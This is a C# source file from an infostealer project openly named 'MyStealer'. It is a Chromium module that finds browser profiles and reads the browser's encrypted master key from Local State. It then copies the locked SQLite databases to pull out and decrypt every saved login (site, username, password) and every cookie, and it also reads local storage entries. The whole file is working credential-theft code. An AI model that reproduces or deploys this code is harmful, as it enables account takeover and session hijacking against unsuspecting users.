using MyStealer.Utils;
using MyStealer.Utils.Chromium;
using Newtonsoft.Json.Linq;
using Serilog;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Text;

namespace MyStealer.Collectors.Browser
{
    internal class Chromium : IBrowserCollector
    {
        public virtual string ApplicationName => "Chromium";

        private ILogger lazyLogger;
        protected ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));

        protected virtual string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Chromium", "User Data");
        protected virtual string[] CookieFilePathList => new string[] { "Cookies", Path.Combine("Network", "Cookies") };

        private ChromiumDecryptor decryptor;
        private ISet<string> profileNameList;

        public bool IsAvailable() => File.Exists(Path.Combine(UserDataPath, "Local State"));

        public void Initialize()
        {
            var localStateFile = Path.Combine(UserDataPath, "Local State");
            var localState = JObject.Parse(File.ReadAllText(localStateFile, encoding: Encoding.UTF8));
            decryptor = new ChromiumDecryptor(localState["os_crypt"]["encrypted_key"].Value<string>());
            profileNameList = new HashSet<string>(localState["profile"]["profiles_order"].Values<string>());
            Logger.Debug("Discovered profiles: {profiles}", string.Join(", ", profileNameList));
        }

        public virtual ISet<CredentialEntry> GetCredentials()
        {
            var set = new HashSet<CredentialEntry>();
            foreach (var profileName in profileNameList)
            {
                foreach (var cred in DecryptLoginData(profileName, Path.Combine(UserDataPath, profileName, "Login Data")))
                    set.Add(cred);
            }

            return set;
        }

        public virtual ISet<CookieEntry> GetCookies()
        {
            var set = new HashSet<CookieEntry>();
            foreach (var profileName in profileNameList)
            {
                foreach (var cookiePath in CookieFilePathList)
                {
                    foreach (var cookie in DecryptCookies(profileName, Path.Combine(UserDataPath, profileName, cookiePath)))
                        set.Add(cookie);
                }
            }

            return set;
        }

        public virtual ISet<LocalStorageEntry> GetLocalStorageEntries()
        {
            var set = new HashSet<LocalStorageEntry>();
            foreach (var profileName in profileNameList)
            {
                foreach (var entry in ReadLocalStorage(profileName, Path.Combine(UserDataPath, profileName, "Local Storage", "leveldb")))
                    set.Add(entry);
            }

            return set;
        }

        private string GetEncryptedString(SQLiteDataReader reader, int i)
        {
            var bufferSize = (int)reader.GetBytes(i, 0, null, 0, 0);
            var buffer = BytePool.Alloc(bufferSize); // the real buffer size may be bigger than `bufferSize`
            try
            {
                reader.GetBytes(i, 0, buffer, 0, bufferSize);
                return decryptor.Decrypt(bufferSize, buffer);
            }
            finally
            {
                BytePool.Free(buffer);
            }
        }

        public ISet<CredentialEntry> DecryptLoginData(string profileName, string loginDataPath)
        {
            var creds = new HashSet<CredentialEntry>();

            if (!File.Exists(loginDataPath))
            {
                Logger.Warning("({profile}) Login Data file does not exists", ApplicationName, profileName);
                return creds;
            }

            Logger.Information("({profile}) Begin parsing Login Data file: {path}", ApplicationName, profileName, loginDataPath);

            var copyName = Path.GetRandomFileName();
            File.Copy(loginDataPath, copyName, true); // prevent reading locked sql database
            Logger.Debug("({profile}) Login Data file {path} copied to {randomName}", profileName, loginDataPath, copyName);

            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                using (var cmd = connection.CreateCommand())
                {
                    cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins;";

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var host = reader.GetString(0);
                            var username = reader.GetString(1);
                            var password = GetEncryptedString(reader, 2);

                            if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                            {
                                creds.Add(new CredentialEntry
                                {
                                    ApplicationName = $"{ApplicationName}",
                                    ApplicationProfileName = profileName,
                                    Host = host,
                                    UserName = username,
                                    Password = password
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Warning(e, "(Profile: {profile}) Error reading login entries",  profileName);
                return creds;
            }
            finally
            {
                File.Delete(copyName);
                Logger.Information("(Profile: {profile}) Read {n} login entries",  profileName, creds.Count);
            }

            return creds;
        }

        public ISet<CookieEntry> DecryptCookies(string profileName, string cookieFile)
        {
            var cookies = new HashSet<CookieEntry>();

            if (!File.Exists(cookieFile))
            {
                Logger.Warning("(Profile: {profile}) Cookies file does not exists: {path}", profileName, cookieFile);
                return cookies;
            }

            Logger.Information("(Profile: {profile}) Begin parsing Cookies file: {path}", profileName, cookieFile);

            var copyName = Path.GetRandomFileName();
            File.Copy(cookieFile, copyName, true); // prevent reading locked sql database
            Logger.Debug("(Profile: {profile}) Login Data file {path} copied to {randomName}", profileName, cookieFile, copyName);

            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                using (var cmd = connection.CreateCommand())
                {
                    cmd.CommandText = "SELECT creation_utc,last_access_utc,expires_utc,priority,samesite,host_key,name,path,value,encrypted_value,is_secure,is_httponly FROM cookies;";

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var creationTime = reader.GetInt64(0);
                            var lastAccessTime = reader.GetInt64(1);
                            var expireTime = reader.GetInt64(2);
                            var priority = reader.GetInt16(3);
                            var sameSite = reader.GetInt16(4);
                            var host = reader.GetString(5);
                            var name = reader.GetString(6);
                            var path = reader.GetString(7);
                            var value = reader.GetString(8); // legacy value
                            if (value.Length == 0)
                                value = GetEncryptedString(reader, 9);

                            var isSecure = reader.GetInt16(10);
                            var isHttpOnly = reader.GetInt16(11);

                            // https://stackoverflow.com/a/43520042
                            var creationDate = new DateTime(Math.Max(0, creationTime / 1000000 - 11644473600), DateTimeKind.Utc);
                            var accessDate = new DateTime(Math.Max(0, lastAccessTime / 1000000 - 11644473600), DateTimeKind.Utc);
                            var expireDate = new DateTime(Math.Max(0, expireTime / 1000000 - 11644473600), DateTimeKind.Utc);

                            // Same_Site
                            // -1 : Undefined
                            // 0 : None
                            // 1 : Lax
                            // 2 : Strict

                            if (!string.IsNullOrEmpty(name))
                            {
                                cookies.Add(new CookieEntry
                                {
                                    ApplicationName = ApplicationName,
                                    ApplicationProfileName = profileName,
                                    CreationDateTime = creationDate,
                                    LastAccessDateTime = accessDate,
                                    ExpireDateTime = expireDate,
                                    Host = host,
                                    Path = path,
                                    Name = name,
                                    Value = value,
                                    IsSecure = isSecure != 0,
                                    IsHttpOnly = isHttpOnly != 0,
                                    SameSite = sameSite,
                                    Priority = priority
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Warning(e, "(Profile: {profile}) Error reading cookie entries", ApplicationName, profileName);
                return cookies;
            }
            finally
            {
                File.Delete(copyName);
                Logger.Information("(Profile: {profile}) Read {n} cookie entries", ApplicationName, profileName, cookies.Count);
            }

            return cookies;
        }

        public ISet<LocalStorageEntry> ReadLocalStorage(string profileName, string levelDbPath)
        {
            var set = new HashSet<LocalStorageEntry>();
            var localStorageDb = new CclChromiumLocalStorage.LocalStoreDb(levelDbPath);

            foreach (var record in localStorageDb.EnumerateRecords())
            {
                var batch = localStorageDb.FindBatch(record.Seq);
                var timeStamp = DateTime.MinValue;
                if (batch != null)
                    timeStamp = batch.TimeStamp;

                set.Add(new LocalStorageEntry
                {
                    ApplicationName = ApplicationName,
                    ApplicationProfileName = profileName,
                    Host = record.StorageKey,
                    Key = record.ScriptKey,
                    Value = record.Value,
                    AccessTimeStamp = timeStamp
                });
            }

            return set;
        }

        public void Dispose() { }
    }
}
